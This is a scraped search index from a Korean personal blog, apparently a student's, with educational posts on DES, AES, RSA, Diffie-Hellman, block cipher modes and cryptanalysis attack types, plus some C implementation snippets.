ER[6]) { int i; for(i=0; i\u0026lt;6; i++) ER[i]=0; ER[0] |=(R[3] \u0026amp; 1) \u0026lt;\u0026lt; 7; ER[0] |=((R[0]\u0026gt;\u0026gt;7) \u0026amp; 1) \u0026lt;\u0026lt; 6; ER[0] |=((R[0]\u0026gt;\u0026gt;6) \u0026amp; 1) \u0026lt;\u0026lt; 5; ER[0] |=((R[0]\u0026gt;\u0026gt;5) \u0026amp; 1) \u0026lt;\u0026lt; 4; ER[0] |=((R[0]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 3; ER[0] |=((R[0]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 2; ER[0] |=((R[0]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 1; ER[0] |=((R[0]\u0026gt;\u0026gt;3) \u0026amp; 1); ER[1] |=((R[0]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 7; ER[1] |=((R[0]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 6; ER[1] |=(R[0] \u0026amp; 1) \u0026lt;\u0026lt; 5; ER[1] |=((R[1]\u0026gt;\u0026gt;7) \u0026amp; 1) \u0026lt;\u0026lt; 4; ER[1] |=(R[0] \u0026amp; 1) \u0026lt;\u0026lt; 3; ER[1] |=((R[1]\u0026gt;\u0026gt;7) \u0026amp; 1) \u0026lt;\u0026lt; 2; ER[1] |=((R[1]\u0026gt;\u0026gt;6) \u0026amp; 1) \u0026lt;\u0026lt; 1; ER[1] |=((R[1]\u0026gt;\u0026gt;5) \u0026amp; 1); ER[2] |=((R[1]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 7; ER[2] |=((R[1]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 6; ER[2] |=((R[1]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 5; ER[2] |=((R[1]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 4; ER[2] |=((R[1]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 3; ER[2] |=((R[1]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 2; ER[2] |=(R[1] \u0026amp; 1) \u0026lt;\u0026lt; 1; ER[2] |=((R[2]\u0026gt;\u0026gt;7) \u0026amp; 1); ER[3] |=(R[1] \u0026amp; 1) \u0026lt;\u0026lt; 7; ER[3] |=((R[2]\u0026gt;\u0026gt;7) \u0026amp; 1) \u0026lt;\u0026lt; 6; ER[3] |=((R[2]\u0026gt;\u0026gt;6) \u0026amp; 1) \u0026lt;\u0026lt; 5; ER[3] |=((R[2]\u0026gt;\u0026gt;5) \u0026amp; 1) \u0026lt;\u0026lt; 4; ER[3] |=((R[2]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 3; ER[3] |=((R[2]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 2; ER[3] |=((R[2]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 1; ER[3] |=((R[2]\u0026gt;\u0026gt;3) \u0026amp; 1); ER[4] |=((R[2]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 7; ER[4] |=((R[2]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 6; ER[4] |=(R[2] \u0026amp; 1) \u0026lt;\u0026lt; 5; ER[4] |=((R[3]\u0026gt;\u0026gt;7) \u0026amp; 1) \u0026lt;\u0026lt; 4; ER[4] |=(R[2] \u0026amp; 1) \u0026lt;\u0026lt; 3; ER[4] |=((R[3]\u0026gt;\u0026gt;7) \u0026amp; 1) \u0026lt;\u0026lt; 2; ER[4] |=((R[3]\u0026gt;\u0026gt;6) \u0026amp; 1) \u0026lt;\u0026lt; 1; ER[4] |=((R[3]\u0026gt;\u0026gt;5) \u0026amp; 1); ER[5] |=((R[3]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 7; ER[5] |=((R[3]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 6; ER[5] |=((R[3]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 5; ER[5] |=((R[3]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 4; ER[5] |=((R[3]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 3; ER[5] |=((R[3]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 2; ER[5] |=(R[3] \u0026amp; 1) \u0026lt;\u0026lt; 1; ER[5] |=((R[0]\u0026gt;\u0026gt;7) \u0026amp; 1); } ","permalink":"https://pol4bear.github.io/posts/des-implementation-in-c/","summary":"DES란? DES(Data Encryption Standard, 데이터 암호화 표준)란?\nC언어로 DES 구현하기 전체 소스 des.h #pragma once //unsinged byte로 사용하기 위해 타입 선언 typedef unsigned char UBYTE; // 복호화 함수 // c: 암호문 k: 키 p: 평문 void DES_dec(UBYTE c[8], UBYTE k[7], UBYTE p[8]); // 암호화 함수 // p: 평문 k: 키 c: 암호문 void DES_enc(UBYTE p[8], UBYTE k[7], UBYTE c[8]); // 라운드 키 생성 함수 // k: 키 sk: 라운드 키 void key_gen(UBYTE k[7], UBYTE sk[16][6]); // end of DES.","title":"C언어로 DES 구현하기"},{"content":"컴퓨터는 2진수로 모든 데이터를 처리한다. 2진수로 음수를 표현하기 위한 여러가지 표현법이 있는데 이 표현법에 대해서 알아보자.\n부호 표현법 음수면 최상위 비트를 1로, 양수면 최상위 비트를 0으로 표현한다.\n0이 0과 -0 총 두개가 존재한다. 사람이 계산하는 것처럼 부호와 절대값을 따로 계산해야 한다. 뺄셈 계산을 위해서 감산기를 추가로 구현해야 한다. 1의 보수 비트를 반전해서 표현한다.\n부호 표현법과 마찬가지로 0이 총 두개가 존재한다. 뺄셈 계산도 가산기로 계산 가능하다. 캐리가 발생되면 LSB에 1을 더해주어야한다. 2의 보수 비트를 반전한 것에 1을 더해서 표현한다.\n0을 한가지 방식으로만 표현해서 다른 표현법보다 음수를 1만큼 더 표현할 수 있다. 1의 보수와 다르게 캐리가 발생했을 때 LSB에 1을 더해주지 않아도 결과가 정확하다. ","permalink":"https://pol4bear.github.io/posts/negative-numbers-in-computer/","summary":"컴퓨터는 2진수로 모든 데이터를 처리한다. 2진수로 음수를 표현하기 위한 여러가지 표현법이 있는데 이 표현법에 대해서 알아보자.\n부호 표현법 음수면 최상위 비트를 1로, 양수면 최상위 비트를 0으로 표현한다.\n0이 0과 -0 총 두개가 존재한다. 사람이 계산하는 것처럼 부호와 절대값을 따로 계산해야 한다. 뺄셈 계산을 위해서 감산기를 추가로 구현해야 한다. 1의 보수 비트를 반전해서 표현한다.\n부호 표현법과 마찬가지로 0이 총 두개가 존재한다. 뺄셈 계산도 가산기로 계산 가능하다. 캐리가 발생되면 LSB에 1을 더해주어야한다. 2의 보수 비트를 반전한 것에 1을 더해서 표현한다.","title":"컴퓨터가 음수를 표현하는 방법"},{"content":" Diffie-Hellman은 키 교환 알고리즘 중 하나로, 대칭키(비밀키) 암호 시스템의 키 교환 문제점을 해결하기 위해 1976년 Whitfield Diffie(휫필드 디피)와 Martin Hellman(마틴 헬만)이 발표하였다.\nDiffie-Hellman은 이산 대수 문제가 어려운 점을 기반으로 개발되었다.\n키 교환 방법 A와 B가 임의의 수인 p와 1\u0026lt;g\u0026lt;p인 g를 생성하여 공유한다.\nA가 자신만 아는 임의의 수인 $X_{A}$를 생성한 후 $Y_{A}$를 계산하여 Bob에게 전송한다. $$ Y_{A} = g^{x_{A}} mod:p​ $$\nBob은 자신만 아는 임의의 수인 $X_{B}$를 생성한 후 $Y_{B}$를 계산하여 Alice에게 전송한다. $$ Y_{B} = g^{X_{B}} mod:p $$\n키 생성 방법 Alice는 Bob에게 전송받은 $Y_{B}$에 자신만 아는 $X_{A}$를 제곱계산해서 대칭키 $K_{AB}$를 얻는다. $$ K_{AB} = Y_{B^{X_{A}}} $$\nBob은 Alice에게 전송받은 $Y_{A}$에 자신만 아는 $X_{B}$를 제곱계산해서 대칭키 $K_{AB}$를 얻는다. $$ K_{AB} = Y_{A^{X_{B}}} $$\nDiffie-Hellman 키 교환 알고리즘에 대한 공격 공격자, 일반 사용자\nAlice와 Bob이 임의의 수인 p와 1\u0026lt;g\u0026lt;p인 g를 공유한다. 공격자 Eve는 스니핑을 통해 Alice와 Bob이 공유하는 p와 g를 탈취한다. Alice가 자신만 아는 임의의 수인 $X_{A}$를 생성한 후 $Y_{A}$를 계산하여 Bob에게 전송한다. Eve는 $Y_{A}$가 Bob에게 전송되는 것을 막고 자신이 생성한 임의의 수인 $X_{E}$로 계산한 $Y_{E}$를 Bob에게 전송한다. Eve는 탈취한 $Y_{A}$에 $X_{E}$를 제곱해 Alice와 자신의 대칭키인 $K_{AE}$를 얻는다. $Y_{E}$를 전송받은 Bob은 자신만 아는 임의의 수인 $X_{B}$를 생성하여 $Y_{B}$를 계산하여 Alice에게 전송한다. Eve는 $Y_{B}$가 Alice에게 전송되는 것을 막고 위에서 생성한 $Y_{E}$를 Alice에게 전송한다. Eve는 탈취한 $Y_{B}$에 $X_{E}$를 제곱해 Alice와 자신의 대칭키인 $K_{BE}$를 얻는다. Bob은 전송받은 $Y_{E}$에 $X_{B}$를 제곱해 Eve와 자신의 대칭키인 $K_{BE}$를 얻는다 $Y_{E}$를 전송받은 Alice는 $Y_{E}$에 $X_{A}$를 제곱해 Eve와 자신의 대칭키인 $K_{AE}$를 얻는다. Eve는 탈취한 $Y_{A}$에 $X_{E}$를 제곱해 Alice와 자신의 대칭키인 $K_{AE}$를 얻는다. ","permalink":"https://pol4bear.github.io/posts/diffie-hellman/","summary":"Diffie-Hellman은 키 교환 알고리즘 중 하나로, 대칭키(비밀키) 암호 시스템의 키 교환 문제점을 해결하기 위해 1976년 Whitfield Diffie(휫필드 디피)와 Martin Hellman(마틴 헬만)이 발표하였다.\nDiffie-Hellman은 이산 대수 문제가 어려운 점을 기반으로 개발되었다.\n키 교환 방법 A와 B가 임의의 수인 p와 1\u0026lt;g\u0026lt;p인 g를 생성하여 공유한다.\nA가 자신만 아는 임의의 수인 $X_{A}$를 생성한 후 $Y_{A}$를 계산하여 Bob에게 전송한다. $$ Y_{A} = g^{x_{A}} mod:p​ $$\nBob은 자신만 아는 임의의 수인 $X_{B}$를 생성한 후 $Y_{B}$를 계산하여 Alice에게 전송한다.","title":"Diffie-Hellman이란?"},{"content":" RSA는 블록 암호 시스템의 일종으로, 비대칭키(공개키) 암호 알고리즘이다.\n1978년 Ronald Rivest(로널드 라이베스트), Adi Shamir(아디 샤미르), Leonard Adleman(레오나드 애들먼)가 개발했다.\n아주 큰 수를 소인수분해하기 어렵다는 점을 이용한 암호화 알고리즘이다.\n나중에 아주 큰 수의 소인수분해를 쉽고 빠르게 하는 방법이 생겨난다면 RSA는 무력화될 수 있다.\n일반적인 암호화 뿐만이 아닌 메시지 인증, 공인인증서, 키 교환 등 다양한 곳에 사용되고 있다.\nRSA 암호화 방식 소수인 $p$와 $q$ 생성(나눠지는 수가 1과 자기 자신밖에 없어야된다.) $n = p × q$ $∅(n) = n~(n-1)$ 사이의 정수들의 갯수. 단, $p$와 $q$는 소수이므로 $∅(n) = (p - 1) × (q - 1)$ $∅(n)$과 서로소(최대공약수가 1)이고, $1 \u0026lt; d \u0026lt; ∅(n)$인 $d$ 선택. $d$의 역원인 $e$ 계산. . 공개키: ($e$, $n$) 개인키: ($d$, $n$) $e$를 개인키로, $d$를 공개키로 사용해도 상관 없다. 하지만, 더 큰 수를 개인키로 사용하는 것이 안전하다. $C$: 암호문, $P$: 평문 암호화: $C = P^{e} mod:n$ 복호화: $P = C^{d} mod:n$ 예제\n소수 $p = 7$, $q = 17$ 생성\n$∅(n)$과 서로 소수이고, $1 \u0026lt; d \u0026lt; ∅(n)$인 d 선택. $d = 77$\n$d × e mod ∅(n) = 1$인 $e$ 선택($d$와 $∅(n)$의 역원 계산). $e = 5$\n공개키: (5, 119)\n개인키: (77, 119)\n전송하고 싶은 데이터 선택: 5\n데이터를 암호화: $(5 ^ 5):mod:119=31$\n암호화된 데이터를 복호화: $(31^77):mod; 119 = 5$\nEuclid Algorithm Euclid 알고리즘은 최대공약수를 알아내기 위한 알고리즘이다.\nRSA의 키를 생성할때 두 수의 최대공약수가 1인 것을 찾아야 하기 때문에 이 알고리즘이 필요하다.\nint gcd(int a, int b) { int tmpA = a; int tmpB = b; int remainder = 0; while(tmpB != 0) { remainder = tmpA mod tmpB; tmpA = tmpB; tmpB = remainder; } return tmpA; } gcd(1970, 1066) 1970 = 1 * 1066 + 904 gcd(1066, 904) 1066 = 1 * 904 + 162 gcd(904, 162) 904 = 5 * 162 + 94 gcd(162, 94) 162 = 1 * 94 + 68 gcd(94, 68) 94 = 1 * 68 + 26 gcd(68, 26) 68 = 2 * 26 + 16 gcd(26, 16) 26 = 1 * 16 + 10 gcd(16, 10) 16 = 1 * 10 + 6 gcd(10, 6) 10 = 1 * 6 + 4 gcd(6, 4) 6 = 1 * 4 + 2 gcd(4, 2) 4 = 2 * 2 + 0 gcd(2, 0) Extended Euclid Algorithm Euclid 알고리즘을 확장해서 최대공약수와 역원을 구하는 알고리즘이다.\ntypedef struct __gcd { int gcd; int inverse; } gcd; gcd extGcd(int a, int b) { gcd sRet = { -1, -1 }; int A1 = 1; int A2 = 0; int A3 = a; int B1 = 0; int B2 = 1; int B3 = b; while (sRet.gcd == -1) { int Q, T1, T2, T3; // 최대공약수: A3, 역원: 없음 if (B3 == 0) { sRet.gcd = A3; sRet.inverse = 0; } // 최대공약수: B3, 역원: B1 else if (B3 == 1) { sRet.gcd = B3; sRet.inverse = B2; } Q = A3 / B3; T1 = A1 - Q * B1; T2 = A2 - Q * B2; T3 = A3 - Q * B3; A1 = B1; A2 = B2; A3 = B3; B1 = T1; B2 = T2; B3 = T3; } return sRet; RSA 빠른 암호화, 복호화 알고리즘 /* input: 평문 또는 암호문 key: e 또는 d n: n output: 암호문 또는 평문 */ int fastExp(int input, int key, int n) { int output = 1; while(key) { if(key % 2 == 1) output = (output * input) % n; input = (input * input) % n; key \u0026gt;\u0026gt;= 1; } return output; } ","permalink":"https://pol4bear.github.io/posts/rivest-shamir-adleman/","summary":"RSA는 블록 암호 시스템의 일종으로, 비대칭키(공개키) 암호 알고리즘이다.\n1978년 Ronald Rivest(로널드 라이베스트), Adi Shamir(아디 샤미르), Leonard Adleman(레오나드 애들먼)가 개발했다.\n아주 큰 수를 소인수분해하기 어렵다는 점을 이용한 암호화 알고리즘이다.\n나중에 아주 큰 수의 소인수분해를 쉽고 빠르게 하는 방법이 생겨난다면 RSA는 무력화될 수 있다.\n일반적인 암호화 뿐만이 아닌 메시지 인증, 공인인증서, 키 교환 등 다양한 곳에 사용되고 있다.\nRSA 암호화 방식 소수인 $p$와 $q$ 생성(나눠지는 수가 1과 자기 자신밖에 없어야된다.) $n = p × q$ $∅(n) = n~(n-1)$ 사이의 정수들의 갯수.","title":"RSA(Rivest–Shamir–Adleman)란?"},{"content":" AES는 블록 암호의 일종으로, 대칭키(비밀키) 암호다.\n컴퓨터 성능이 발전함에 따라 취약해진 DES 암호 알고리즘을 대체하기 위해 만들어졌다.\n1997년에 열린 AES 공모전에서 선정된 Joan Daemen과 Vincent Rijmen 의 Rijndael 알고리즘을 기반으로 한 암호 알고리즘이다.\nAES 암호 알고리즘의 표준 문서는 FIPS 197이다.\n복호화는 암호화 알고리즘을 반대로 적용하고, 암호화 라운드 키를 역순으로 적용하면 된다.\n키 생성 AES는 128/192/256비트의 키를 입력받아서 10/12/14라운드에서 사용할 128비트의 길이인 라운드 키를 11/13/15개 생성한다. 키 생성 구조 $$ W^{i} = W^{i-1}:xor:W^{i-4} $$ 단, i가 4의 배수면 $$ W^{i} = g(W^{i-1});xor:W^{i-4} $$ g 함수 RotWord: 왼쪽으로 쉬프트(1 바이트만큼) 한번. 단, 가장 왼쪽에 있었던 바이트는 오른쪽에 붙인다.\nSubWord: AES 암호화 알고리즘의 S-box 통과. 왼쪽 4비트가 행이 되고 오른쪽 4비트가 열이 된다.\nXOR with Rcon[j]: 라운드에 맞는 Rcon의 값과 xor 연산\nByte Substitution(Substitute Bytes) 한 바이트를 가져와서 앞의 4바이트(16진수)는 행으로 뒤의 4바이트(16진수)는 열로 해서 데이터를 바꾼다.\n암호화할 때는 S-Box를 복호화할때는 Inverse S-Box를 적용한다.\nShift Rows 첫 번째 행을 제외하고 행 번호 만큼 왼쪽으로 1바이트(4비트) 쉬프트 해준다. 왼쪽으로 밀려 없어지는 바이트들은 오른쪽에 붙여준다. Mix Columns 목적지의 행 번호를 아래 표의 행으로, 열 번호를 들어온 데이터의 열로 해서 각각 곱해준 후 xor해준다. 단, 3을 곱해야하면 먼저 데이터에 2를 곱해주고 데이터 자기 자신을 xor 해준다.\n곱해주는 중에 비트가 9번째 비트 자리($2^{8}$)로 넘어가면 0x11B(1 0001 1011)와 XOR 연산을 한다.\n","permalink":"https://pol4bear.github.io/posts/advanced-encryption-standard/","summary":"AES는 블록 암호의 일종으로, 대칭키(비밀키) 암호다.\n컴퓨터 성능이 발전함에 따라 취약해진 DES 암호 알고리즘을 대체하기 위해 만들어졌다.\n1997년에 열린 AES 공모전에서 선정된 Joan Daemen과 Vincent Rijmen 의 Rijndael 알고리즘을 기반으로 한 암호 알고리즘이다.\nAES 암호 알고리즘의 표준 문서는 FIPS 197이다.\n복호화는 암호화 알고리즘을 반대로 적용하고, 암호화 라운드 키를 역순으로 적용하면 된다.\n키 생성 AES는 128/192/256비트의 키를 입력받아서 10/12/14라운드에서 사용할 128비트의 길이인 라운드 키를 11/13/15개 생성한다. 키 생성 구조 $$ W^{i} = W^{i-1}:xor:W^{i-4} $$ 단, i가 4의 배수면 $$ W^{i} = g(W^{i-1});xor:W^{i-4} $$ g 함수 RotWord: 왼쪽으로 쉬프트(1 바이트만큼) 한번.","title":"AES(Advanced Encryption Standard, 고급 암호화 표준)란?"},{"content":" DES는 블록 암호의 일종으로, 대칭키(비밀키) 암호다.\n1974년 8월 27일 IBM에서 제안한 루시퍼 알고리즘을 기반으로 한 알고리즘이다\nDES의 표준 문서는 FIPS 46-3이다.\n암호화 또는 복호화할 때 쓰이는 알고리즘에 차이가 없고 라운드 키만 역순으로 적용하면 된다.\n초기 전치와 역 초기 전치 초기 전치와 역 초기 전치는 입력받은 값의 비트들을 뒤섞어주는 것이다.\n첫 라운드를 시작하기 전에 초기 전치를, 마지막 라운드가 끝나고 역 초기 전치를 실행한다.\n키 생성 64비트의 키를 입력받아서 총 16라운드에서 사용할 48비트의 길이인 라운드 키 16개를 생성한다. $$ C^{i} = C^{i-1} \u0026laquo; [Shift: size] $$\n$$ D^{i} = D^{i-1} \u0026laquo; [Shift: size] $$\n1, 2, 9, 16 라운드는 1만큼 쉬프트하고 나머지 라운드는 2씩 쉬프트한다. $$ K^{i} = PC2((C^{i} \u0026laquo; 28) xor D^{i}) $$\nf 함수 평문을 반으로 나눠 왼쪽 블록과 오른쪽 블록으로 구분한다.\n왼쪽 블록 $L^{i} = R^{i-1}$ 오른쪽 블록 $R^{i} = L^{i} xor f(R^{i-1})$ f 함수는 32비트의 이전 라운드 오른쪽 평문 블록과 48비트의 라운드키를 입력받아 연산한 후 다시 32비트의 값을 반환하게 된다.\nf 함수 구조 라운드키와 xor 하기 위해 비트 확장표로 입력받은 이전 라운드의 오른쪽 평문 블록 48비트로 확장 48비트로 확장된 이전 라운드의 오른쪽 평문 블록과 라운드키 xor 2단계의 결과값(48비트)에서 6비트씩 8개의 박스(S-box)에 집어넣어 각 박스당 4비트의 데이터씩만 가져와서 32비트로 만든다. 3단계의 결과값(32비트)를 치환한 후 반환한다. Expansion(비트 확장) 구조 입력받은 32비트의 데이터를 4비트씩 8세트로 나누고 앞과 뒤에 한 비트씩을 붙인다. 앞에 붙인 비트는 이전 세트의 마지막 비트 마지막 비트는 다음 세트의 처음 비트로 한다. 이전 세트가 없는 처음 세트의 첫 비트는 마지막 비트인 32번째 비트로 하고, 다음 세트가 없는 마지 S-box(Substitution-box, 비트 축소) 구조 입력받은 48비트의 데이터를 6비트씩 8세트로 나눈다. 각 세트의 첫 비트와 마지막 비트를 가져와서 행으로, 나머지 4비트를 열로 해서 S-box 표에서 4비트의 데이터를 가져온다. 예를 들어 첫번째 S1(S-box 1)에 입력된 비트가 101010 이라면 행: 10 = 2 열: 0101 = 5. S1[2][5] = 6이기 때문에 0110이 반환된다. P(Permutation, 비트 치환) 구조 32 비트 길이 데이터의 순서를 섞는다. ","permalink":"https://pol4bear.github.io/posts/data-encryption-standard/","summary":"DES는 블록 암호의 일종으로, 대칭키(비밀키) 암호다.\n1974년 8월 27일 IBM에서 제안한 루시퍼 알고리즘을 기반으로 한 알고리즘이다\nDES의 표준 문서는 FIPS 46-3이다.\n암호화 또는 복호화할 때 쓰이는 알고리즘에 차이가 없고 라운드 키만 역순으로 적용하면 된다.\n초기 전치와 역 초기 전치 초기 전치와 역 초기 전치는 입력받은 값의 비트들을 뒤섞어주는 것이다.\n첫 라운드를 시작하기 전에 초기 전치를, 마지막 라운드가 끝나고 역 초기 전치를 실행한다.\n키 생성 64비트의 키를 입력받아서 총 16라운드에서 사용할 48비트의 길이인 라운드 키 16개를 생성한다.","title":"DES(Data Encryption Standard, 데이터 암호화 표준)란?"},{"content":" XTS-AES 모드는 데이터를 저장에 특화된 운용 모드다. 같은 데이터라도 데이터가 저장되어 있는 위치에 따라 암호문이 달라진다는 특징을 가지고 있다. 또한 블록 암호에 사용되는 모드임에도 평문의 크기가 암호 알고리즘의 블록 크기와 맞아 떨어지지 않더라도 암호문의 크기가 평문보다 커지지 않는다는 특징을 가지고 있다. XTS-AES 모드는 총 두개의 키를 사용한다. 암호화 복호화 ","permalink":"https://pol4bear.github.io/posts/block-cipher-mode-xts-aes/","summary":" XTS-AES 모드는 데이터를 저장에 특화된 운용 모드다. 같은 데이터라도 데이터가 저장되어 있는 위치에 따라 암호문이 달라진다는 특징을 가지고 있다. 또한 블록 암호에 사용되는 모드임에도 평문의 크기가 암호 알고리즘의 블록 크기와 맞아 떨어지지 않더라도 암호문의 크기가 평문보다 커지지 않는다는 특징을 가지고 있다. XTS-AES 모드는 총 두개의 키를 사용한다. 암호화 복호화 ","title":"블록 지향 저장장치를 위한 블록 암호 운용 모드 XTS-AES"},{"content":"암호 알고리즘에는 크게 스트림, 블록 암호 알고리즘 두 가지 종류로 나뉜다.\n스트림 암호는 1비트 단위의 난수를 연속적으로 생성해서 비트 단위로 암호화한다. 반면, 블록 암호는 평문을 키의 길이와 같은 블록으로 나눠서 블록 단위로 암호화한다.\n블록 암호에는 용도를 바꾸거나 보안성을 증가시키기 위한 여러 모드들이 존재한다.\n블록 암호 운용 모드 블록 암호 운용 모드의 특징 코드북 생성 여부: 키와 평문이 같을 때 항상 동일한 암호문이 생성되는가. 코드북이 안생겨나는 편이 좋다. 오류 전파 정도: 전송 상에서 암호문 1개 블록이 잘못됐을 때, 다음 블록들을 복호화할 때 얼마나 많은 영향을 미치는가. 오류 전파 정도가 적을 수록 좋다. 병렬처리 여부: 블록들의 암호화/복호화가 동시에 처리될 수 있는가. 병렬처리가 가능하면 암호화/복호화 속도를 빠르게 할 수 있기 때문에 좋다. 블록 암호 운용 모드의 종류 Electronic CodeBook Mode(ECB) 가장 기본적으로 블록 암호라고 할 때 생각나는 운용 모드다. ECB는 다른 특정한 값 없이 평문을 키로 암호화만 하기 때문에 동시에 암호화/복호화가 가능하기 때문에 속도 측면에서 매우 빠르다. 특징 코드북 생성: Y 오류 전파 정도: 자기 자신 병렬처리 여부: Y Cipher Block Chaining(CBC) 첫 번째 블록을 암호화 하기 전 해당 블록의 평문 블록과 IV(Initialization Vector)라는 값을 XOR(Exclusive OR) 연산한 후 암호화한다. 두 번째 블록부터 자신의 전 블록의 암호문 블록과 해당 블록의 평문 블록과 XOR 연산한 후 암호화한다. 복호화는 첫 번째 블록은 해당 블록을 복호화 하고 IV와 XOR 연산을 하면 평문이 된다. 두 번째 블록부터는 해당 블록을 복호화 하고 자신의 전 블록의 암호문 블록과 XOR 연산을 하면 평문이 된다. 암호화를 할 때 전 블록의 암호문 블록이 필요하기 때문에 여러 블록을 동시에 암호화하는 것은 불가능하다. 그 전 평문 블록에 대한 암호문 블록은 이미 알고 있기 때문에 동시에 여러 블록을 동시에 복호화하는 것이 가능하다. 특징 코드북 생성: N 오류 전파 정도: 자기 자신과 자신 다음 블록 병렬처리 여부: 복호화만 Cipher FeedBack(CFB) 평문을 암호화하는 것이 아닌 IV를 암호화하는 특이한 방식의 모드다. 첫 번째 블록은 IV를 암호화한 후 해당 평문 블록과 XOR 연산하면 암호문이 된다. 두 번째 블록부터는 IV값을 특정 비트만큼 좌측 쉬프트 연산해서 MSB(좌측) 부분의 일정 부분을 없애고 LSB(우측) 부분에 이 전 암호문 블록의 일정 부분을 결합하여 암호화한 후 해당 블록의 평문 블록과 XOR 연산하면 암호문이 된다. 복호화할 때 첫 번째 블록은 IV를 암호화 하고 암호문과 XOR 연산을 하여 복호화한다. 두 번째 블록부터는 암호화와 같이 IV의 일정 부분과 이 전 블록의 암호문 블록을 결합한 블록을 암호화한 후 해당 블록의 암호문 블록과 XOR 연산을 하여 복호화한다. CBC와 마찬카지로 그 전 블록의 암호문 블록이 필요하기 때문에 여러 블록을 동시에 암호화하는 것은 불가능하다. 복호화 할 때는 암호문 블록을 가지고 있기 때문에 IV들이 미리 계산되어 있다면 동시에 복호화하는 것이 가능하다. 특징 코드북 생성: N 오류 전파 정도: IV에서 오류난 암호문 블록이 쉬프트 연산되어 없어질 때까지 병렬처리 여부: 복호화만 Output FeedBack(OFB) CFB 모드의 오류 전파도가 높다는 단점을 보완한 모드다. CFB 모드와 비슷하지만 CFB와 달리 IV의 일정 부분을 없애고 결합하는 것이 이 전 블록의 암호 블록이 아니라 이전 블록의 IV를 암호화한 블록이다. 첫 번째 블록은 IV를 암호화한 후 해당 평문 블록과 XOR 연산하면 암호문이 된다. 두 번째 블록부터는 IV값을 특정 비트만큼 좌측 쉬프트 연산해서 MSB(좌측) 부분의 일정 부분을 없애고 LSB(우측) 부분에 이 전 블록의 암호화된 IV의 일정 부분을 결합하여 암호화한 후 해당 블록의 평문 블록과 XOR 연산하면 암호문이 된다. CFB와 달리 각 IV들을 미리 계산해 놓는다는 가정 하에 동시에 암호화하는 것이 가능하다. CFB와 마찬가지로 복호화 할 때는 암호문 블록을 가지고 있기 때문에 IV들이 미리 계산되어 있다면 동시에 복호화하는 것이 가능하다. CFB와 달리 특정 암호문 블록이 잘못 되었어도 IV 값만 정상이면 잘못된 암호문 블록만 문제가 된다. 특징 코드북 생성: N 오류 전파 정도: 자기 자신 병렬처리 여부: 제한적 암호화와 복호화 Counter(CTR) 암호화와 복호화 방식이 동일하기 때문에 ECB를 제외하면 구현하기 가장 쉬운 모드다. 블록의 길이가 128비트라고 가정했을 때 앞의 64비트(8바이트)는 임의의 값이 들어가고 뒤의 64비트(8바이트)는 블록 번호가 들어간다. 뒤의 8바이트에 있는 블록번호는 블록 암호화가 진행되면서 계속적으로 값이 증가한다. 위와 같이 생성된 카운터를 암호화한 후 평문과 XOR 연산해서 암호문을 얻는다.카운터를 암호화하여 생성된 키 스트림을 미리 생성해 놓는다면 동시에 암호화/복호화 하는 것이 가능하다. 특징 코드북 생성: N 오류 전파 정도: 자기 자신 병렬처리 여부: Y ","permalink":"https://pol4bear.github.io/posts/modes-of-block-cipher/","summary":"암호 알고리즘에는 크게 스트림, 블록 암호 알고리즘 두 가지 종류로 나뉜다.\n스트림 암호는 1비트 단위의 난수를 연속적으로 생성해서 비트 단위로 암호화한다. 반면, 블록 암호는 평문을 키의 길이와 같은 블록으로 나눠서 블록 단위로 암호화한다.\n블록 암호에는 용도를 바꾸거나 보안성을 증가시키기 위한 여러 모드들이 존재한다.\n블록 암호 운용 모드 블록 암호 운용 모드의 특징 코드북 생성 여부: 키와 평문이 같을 때 항상 동일한 암호문이 생성되는가. 코드북이 안생겨나는 편이 좋다. 오류 전파 정도: 전송 상에서 암호문 1개 블록이 잘못됐을 때, 다음 블록들을 복호화할 때 얼마나 많은 영향을 미치는가.","title":"블록 암호 운용 모드"},{"content":" 공격자가 대상간 통신되는 정보를 알아내려고 스니핑을 시도하더라도 암호화된 통신이 이루어지고 있다면 공격자는 일반적인 방법으로는 통신의 내용을 알아낼 수 없다.\n스니핑을 통해 수집한 데이터의 내용을 알아내기 위해 해당 수집한 암호문에 여러가지 공격을 시도할 수 있다.\n공격 방법에는 대상간 통신을 도청, 변조 하는 중간자 공격(MITM, Man In The Middle Attack)과 암호 통신에서 사용하는 암호 알고리즘(DES, AES, RSA)을 공략해 암호 알고리즘을 공격하는 방법도 있다.\n공격의 종류 암호문 단독 공격(COA, Ciphertext-Only Attack) 암호화되서 전송되는 데이터인 암호문만을 가지고 평문과 암호키를 찾아내는 공격이다. 공격자에게 가장 불리한 공격이다. 기지 평문 공격(KPA, Known-Plaintext Attack) 암호 알고리즘 중에도 코드북이 생성되는 암호 알고리즘에 시도할 수 있는 공격이다. 공격자가 평문-암호문의 짝을 알 고 있다는 전제하에 가능한 공격이다. 공격자가 수집한 평문-암호문 짝을 이용해 새로운 암호문에 대한 평문을 알아내는 공격이다. 선택 평문 공격(CPA, Chosen-Plaintext Attack) 공격자가 선택된 평문들에 대한 암호문을 얻을 수 있다는 전제하에 할 수 있는 